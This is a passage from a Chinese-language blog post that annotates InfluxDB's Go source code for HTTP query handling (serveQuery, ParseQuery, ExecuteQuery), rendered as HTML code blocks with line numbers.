class="line">&#125;</span><br></pre></td></tr></table></figure><p>查询函数serveQuery；</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// serveQuery parses an incoming query and, if valid, executes the query.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(h *Handler)</span> <span class="title">serveQuery</span><span class="params">(w http.ResponseWriter, r *http.Request, user meta.User)</span></span> &#123;</span><br><span class="line">atomic.AddInt64(&amp;h.stats.QueryRequests, <span class="number">1</span>)</span><br><span class="line"><span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">(start time.Time)</span></span> &#123;</span><br><span class="line">atomic.AddInt64(&amp;h.stats.QueryRequestDuration, time.Since(start).Nanoseconds())</span><br><span class="line">&#125;(time.Now())</span><br><span class="line">h.requestTracker.Add(r, user)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Retrieve the underlying ResponseWriter or initialize our own.</span></span><br><span class="line">rw, ok := w.(ResponseWriter)</span><br><span class="line"><span class="keyword">if</span> !ok &#123;</span><br><span class="line">rw = NewResponseWriter(w, r)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Retrieve the node id the query should be executed on.</span></span><br><span class="line">nodeID, _ := strconv.ParseUint(r.FormValue(<span class="string">"node_id"</span>), <span class="number">10</span>, <span class="number">64</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> qr io.Reader</span><br><span class="line"><span class="comment">// Attempt to read the form value from the "q" form value.</span></span><br><span class="line"><span class="keyword">if</span> qp := strings.TrimSpace(r.FormValue(<span class="string">"q"</span>)); qp != <span class="string">""</span> &#123;</span><br><span class="line">qr = strings.NewReader(qp)</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> r.MultipartForm != <span class="literal">nil</span> &amp;&amp; r.MultipartForm.File != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="comment">// If we have a multipart/form-data, try to retrieve a file from 'q'.</span></span><br><span class="line"><span class="keyword">if</span> fhs := r.MultipartForm.File[<span class="string">"q"</span>]; <span class="built_in">len</span>(fhs) &gt; <span class="number">0</span> &#123;</span><br><span class="line">f, err := fhs[<span class="number">0</span>].Open()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">h.httpError(rw, err.Error(), http.StatusBadRequest)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> f.Close()</span><br><span class="line">qr = f</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> qr == <span class="literal">nil</span> &#123;</span><br><span class="line">h.httpError(rw, <span class="string">`missing required parameter "q"`</span>, http.StatusBadRequest)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">epoch := strings.TrimSpace(r.FormValue(<span class="string">"epoch"</span>))</span><br><span class="line"><span class="comment">// 初始化查询解析器</span></span><br><span class="line">p := influxql.NewParser(qr)</span><br><span class="line">db := r.FormValue(<span class="string">"db"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Sanitize the request query params so it doesn't show up in the response logger.</span></span><br><span class="line"><span class="comment">// Do this before anything else so a parsing error doesn't leak passwords.</span></span><br><span class="line">sanitize(r)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Parse the parameters</span></span><br><span class="line">rawParams := r.FormValue(<span class="string">"params"</span>)</span><br><span class="line"><span class="keyword">if</span> rawParams != <span class="string">""</span> &#123;</span><br><span class="line"><span class="keyword">var</span> params <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">interface</span>&#123;&#125;</span><br><span class="line">decoder := json.NewDecoder(strings.NewReader(rawParams))</span><br><span class="line">decoder.UseNumber()</span><br><span class="line"><span class="keyword">if</span> err := decoder.Decode(&amp;params); err != <span class="literal">nil</span> &#123;</span><br><span class="line">h.httpError(rw, <span class="string">"error parsing query parameters: "</span>+err.Error(), http.StatusBadRequest)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Convert json.Number into int64 and float64 values</span></span><br><span class="line"><span class="keyword">for</span> k, v := <span class="keyword">range</span> params &#123;</span><br><span class="line"><span class="keyword">if</span> v, ok := v.(json.Number); ok &#123;</span><br><span class="line"><span class="keyword">var</span> err error</span><br><span class="line"><span class="keyword">if</span> strings.Contains(<span class="keyword">string</span>(v), <span class="string">"."</span>) &#123;</span><br><span class="line">params[k], err = v.Float64()</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">params[k], err = v.Int64()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">h.httpError(rw, <span class="string">"error parsing json value: "</span>+err.Error(), http.StatusBadRequest)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">p.SetParams(params)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Parse query from query string.</span></span><br><span class="line">    <span class="comment">//开始解析query查询语句</span></span><br><span class="line">q, err := p.ParseQuery()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">h.httpError(rw, <span class="string">"error parsing query: "</span>+err.Error(), http.StatusBadRequest)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check authorization.</span></span><br><span class="line">    <span class="comment">//检查认证信息</span></span><br><span class="line"><span class="keyword">if</span> h.Config.AuthEnabled &#123;</span><br><span class="line"><span class="keyword">if</span> err := h.QueryAuthorizer.AuthorizeQuery(user, q, db); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">if</span> err, ok := err.(meta.ErrAuthorize); ok &#123;</span><br><span class="line">h.Logger.Info(<span class="string">"Unauthorized request"</span>,</span><br><span class="line">zap.String(<span class="string">"user"</span>, err.User),</span><br><span class="line">zap.Stringer(<span class="string">"query"</span>, err.Query),</span><br><span class="line">logger.Database(err.Database))</span><br><span class="line">&#125;</span><br><span class="line">h.httpError(rw, <span class="string">"error authorizing query: "</span>+err.Error(), http.StatusForbidden)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Parse chunk size. Use default if not provided or unparsable.</span></span><br><span class="line">chunked := r.FormValue(<span class="string">"chunked"</span>) == <span class="string">"true"</span></span><br><span class="line">chunkSize := DefaultChunkSize</span><br><span class="line"><span class="keyword">if</span> chunked &#123;</span><br><span class="line"><span class="keyword">if</span> n, err := strconv.ParseInt(r.FormValue(<span class="string">"chunk_size"</span>), <span class="number">10</span>, <span class="number">64</span>); err == <span class="literal">nil</span> &amp;&amp; <span class="keyword">int</span>(n) &gt; <span class="number">0</span> &#123;</span><br><span class="line">chunkSize = <span class="keyword">int</span>(n)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Parse whether this is an async command.</span></span><br><span class="line">async := r.FormValue(<span class="string">"async"</span>) == <span class="string">"true"</span></span><br><span class="line"><span class="comment">//参数实例化</span></span><br><span class="line">opts := query.ExecutionOptions&#123;</span><br><span class="line">Database:        db,</span><br><span class="line">RetentionPolicy: r.FormValue(<span class="string">"rp"</span>),</span><br><span class="line">ChunkSize:       chunkSize,</span><br><span class="line">ReadOnly:        r.Method == <span class="string">"GET"</span>,</span><br><span class="line">NodeID:          nodeID,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> h.Config.AuthEnabled &#123;</span><br><span class="line"><span class="comment">// The current user determines the authorized actions.</span></span><br><span class="line">opts.Authorizer = user</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// Auth is disabled, so allow everything.</span></span><br><span class="line">opts.Authorizer = query.OpenAuthorizer</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Make sure if the client disconnects we signal the query to abort</span></span><br><span class="line"><span class="keyword">var</span> closing <span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line"><span class="keyword">if</span> !async &#123;</span><br><span class="line">closing = <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;)</span><br><span class="line"><span class="keyword">if</span> notifier, ok := w.(http.CloseNotifier); ok &#123;</span><br><span class="line"><span class="comment">// CloseNotify() is not guaranteed to send a notification when the query</span></span><br><span class="line"><span class="comment">// is closed. Use this channel to signal that the query is finished to</span></span><br><span class="line"><span class="comment">// prevent lingering goroutines that may be stuck.</span></span><br><span class="line">done := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;)</span><br><span class="line"><span class="keyword">defer</span> <span class="built_in">close</span>(done)</span><br><span class="line"></span><br><span class="line">notify := notifier.CloseNotify()</span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">// Wait for either the request to finish</span></span><br><span class="line"><span class="comment">// or for the client to disconnect</span></span><br><span class="line"><span class="keyword">select</span> &#123;</span><br><span class="line"><span class="keyword">case</span> &lt;-done:</span><br><span class="line"><span class="keyword">case</span> &lt;-notify:</span><br><span class="line"><span class="built_in">close</span>(closing)</span><br><span class="line">&#125;</span><br><span class="line">&#125;()</span><br><span class="line">opts.AbortCh = done</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">defer</span> <span class="built_in">close</span>(closing)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Execute query.</span></span><br><span class="line">    <span class="comment">//执行查询语句</span></span><br><span class="line">results := h.QueryExecutor.ExecuteQuery(q, opts, closing)</span><br><span class="line"></span><br><span class="line"><span class="comment">// If we are running in async mode, open a goroutine to drain the results</span></span><br><span class="line"><span class="comment">// and return with a StatusNoContent.</span></span><br><span class="line"><span class="keyword">if</span> async &#123;</span><br><span class="line"><span class="keyword">go</span> h.async(q, results)</span><br><span class="line">h.writeHeader(w, http.StatusNoContent)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// if we're not chunking, this will be the in memory buffer for all results before sending to client</span></span><br><span class="line">resp := Response&#123;Results: <span class="built_in">make</span>([]*query.Result, <span class="number">0</span>)&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Status header is OK once this point is reached.</span></span><br><span class="line"><span class="comment">// Attempt to flush the header immediately so the client gets the header information</span></span><br><span class="line"><span class="comment">// and knows the query was accepted.</span></span><br><span class="line">h.writeHeader(rw, http.StatusOK)</span><br><span class="line"><span class="keyword">if</span> w, ok := w.(http.Flusher); ok &#123;</span><br><span class="line">w.Flush()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// pull all results from the channel</span></span><br><span class="line">rows := <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> r := <span class="keyword">range</span> results &#123;</span><br><span class="line"><span class="comment">// Ignore nil results.</span></span><br><span class="line"><span class="keyword">if</span> r == <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// if requested, convert result timestamps to epoch</span></span><br><span class="line"><span class="keyword">if</span> epoch != <span class="string">""</span> &#123;</span><br><span class="line">convertToEpoch(r, epoch)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Write out result immediately if chunked.</span></span><br><span class="line"><span class="keyword">if</span> chunked &#123;</span><br><span class="line">n, _ := rw.WriteResponse(Response&#123;</span><br><span class="line">Results: []*query.Result&#123;r&#125;,</span><br><span class="line">&#125;)</span><br><span class="line">atomic.AddInt64(&amp;h.stats.QueryRequestBytesTransmitted, <span class="keyword">int64</span>(n))</span><br><span class="line">w.(http.Flusher).Flush()</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Limit the number of rows that can be returned in a non-chunked</span></span><br><span class="line"><span class="comment">// response.  This is to prevent the server from going OOM when</span></span><br><span class="line"><span class="comment">// returning a large response.  If you want to return more than the</span></span><br><span class="line"><span class="comment">// default chunk size, then use chunking to process multiple blobs.</span></span><br><span class="line"><span class="comment">// Iterate through the series in this result to count the rows and</span></span><br><span class="line"><span class="comment">// truncate any rows we shouldn't return.</span></span><br><span class="line">        <span class="comment">//最大限制数目</span></span><br><span class="line"><span class="keyword">if</span> h.Config.MaxRowLimit &gt; <span class="number">0</span> &#123;</span><br><span class="line"><span class="keyword">for</span> i, series := <span class="keyword">range</span> r.Series &#123;</span><br><span class="line">n := h.Config.MaxRowLimit - rows</span><br><span class="line"><span class="keyword">if</span> n &lt; <span class="built_in">len</span>(series.Values) &#123;</span><br><span class="line"><span class="comment">// We have reached the maximum number of values. Truncate</span></span><br><span class="line"><span class="comment">// the values within this row.</span></span><br><span class="line">series.Values = series.Values[:n]</span><br><span class="line"><span class="comment">// Since this was truncated, it will always be a partial return.</span></span><br><span class="line"><span class="comment">// Add this so the client knows we truncated the response.</span></span><br><span class="line">series.Partial = <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line">rows += <span class="built_in">len</span>(series.Values)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> rows &gt;= h.Config.MaxRowLimit &#123;</span><br><span class="line"><span class="comment">// Drop any remaining series since we have already reached the row limit.</span></span><br><span class="line"><span class="keyword">if</span> i &lt; <span class="built_in">len</span>(r.Series) &#123;</span><br><span class="line">r.Series = r.Series[:i+<span class="number">1</span>]</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// It's not chunked so buffer results in memory.</span></span><br><span class="line"><span class="comment">// Results for statements need to be combined together.</span></span><br><span class="line"><span class="comment">// We need to check if this new result is for the same statement as</span></span><br><span class="line"><span class="comment">// the last result, or for the next statement</span></span><br><span class="line">l := <span class="built_in">len</span>(resp.Results)</span><br><span class="line"><span class="keyword">if</span> l == <span class="number">0</span> &#123;</span><br><span class="line">resp.Results = <span class="built_in">append</span>(resp.Results, r)</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> resp.Results[l<span class="number">-1</span>].StatementID == r.StatementID &#123;</span><br><span class="line"><span class="keyword">if</span> r.Err != <span class="literal">nil</span> &#123;</span><br><span class="line">resp.Results[l<span class="number">-1</span>] = r</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cr := resp.Results[l<span class="number">-1</span>]</span><br><span class="line">rowsMerged := <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(cr.Series) &gt; <span class="number">0</span> &#123;</span><br><span class="line">lastSeries := cr.Series[<span class="built_in">len</span>(cr.Series)<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _, row := <span class="keyword">range</span> r.Series &#123;</span><br><span class="line"><span class="keyword">if</span> !lastSeries.SameSeries(row) &#123;</span><br><span class="line"><span class="comment">// Next row is for a different series than last.</span></span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Values are for the same series, so append them.</span></span><br><span class="line">lastSeries.Values = <span class="built_in">append</span>(lastSeries.Values, row.Values...)</span><br><span class="line">rowsMerged++</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Append remaining rows as new rows.</span></span><br><span class="line">r.Series = r.Series[rowsMerged:]</span><br><span class="line">cr.Series = <span class="built_in">append</span>(cr.Series, r.Series...)</span><br><span class="line">cr.Messages = <span class="built_in">append</span>(cr.Messages, r.Messages...)</span><br><span class="line">cr.Partial = r.Partial</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">resp.Results = <span class="built_in">append</span>(resp.Results, r)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Drop out of this loop and do not process further results when we hit the row limit.</span></span><br><span class="line"><span class="keyword">if</span> h.Config.MaxRowLimit &gt; <span class="number">0</span> &amp;&amp; rows &gt;= h.Config.MaxRowLimit &#123;</span><br><span class="line"><span class="comment">// If the result is marked as partial, remove that partial marking</span></span><br><span class="line"><span class="comment">// here. While the series is partial and we would normally have</span></span><br><span class="line"><span class="comment">// tried to return the rest in the next chunk, we are not using</span></span><br><span class="line"><span class="comment">// chunking and are truncating the series so we don't want to</span></span><br><span class="line"><span class="comment">// signal to the client that we plan on sending another JSON blob</span></span><br><span class="line"><span class="comment">// with another result.  The series, on the other hand, still</span></span><br><span class="line"><span class="comment">// returns partial true if it was truncated or had more data to</span></span><br><span class="line"><span class="comment">// send in a future chunk.</span></span><br><span class="line">r.Partial = <span class="literal">false</span></span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// If it's not chunked we buffered everything in memory, so write it out</span></span><br><span class="line"><span class="keyword">if</span> !chunked &#123;</span><br><span class="line">n, _ := rw.WriteResponse(resp)</span><br><span class="line">atomic.AddInt64(&amp;h.stats.QueryRequestBytesTransmitted, <span class="keyword">int64</span>(n))</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数ParseQuery函数解析query：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ParseQuery parses an InfluxQL string and returns a Query AST object.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *Parser)</span> <span class="title">ParseQuery</span><span class="params">()</span> <span class="params">(*Query, error)</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> statements Statements</span><br><span class="line">semi := <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line"><span class="keyword">if</span> tok, pos, lit := p.ScanIgnoreWhitespace(); tok == EOF &#123;<span class="comment">//如果tok==EOF的时候，正常解析完成返回;</span></span><br><span class="line"><span class="keyword">return</span> &amp;Query&#123;Statements: statements&#125;, <span class="literal">nil</span></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> tok == SEMICOLON &#123;</span><br><span class="line">semi = <span class="literal">true</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> !semi &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, newParseError(tokstr(tok, lit), []<span class="keyword">string</span>&#123;<span class="string">";"</span>&#125;, pos)</span><br><span class="line">&#125;</span><br><span class="line">p.Unscan()</span><br><span class="line">s, err := p.ParseStatement() <span class="comment">//解析词</span></span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line">statements = <span class="built_in">append</span>(statements, s) <span class="comment">//返回解析的statments</span></span><br><span class="line">semi = <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行解析的executeQuery函数：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ExecuteQuery executes each statement within a query.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(e *Executor)</span> <span class="title">ExecuteQuery</span><span class="params">(query *influxql.Query, opt ExecutionOptions, closing <span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;)</span> &lt;-<span class="title">chan</span> *<span class="title">Result</span></span> &#123;</span><br><span class="line">results := <span class="built_in">make</span>(<span class="keyword">chan</span> *Result)</span><br><span class="line"><span class="keyword">go</span> e.executeQuery(query, opt, closing, results)  <span class="comment">//执行查询语句</span></span><br><span class="line"><span class="keyword">return</span> results</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用executeQuery函数：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span 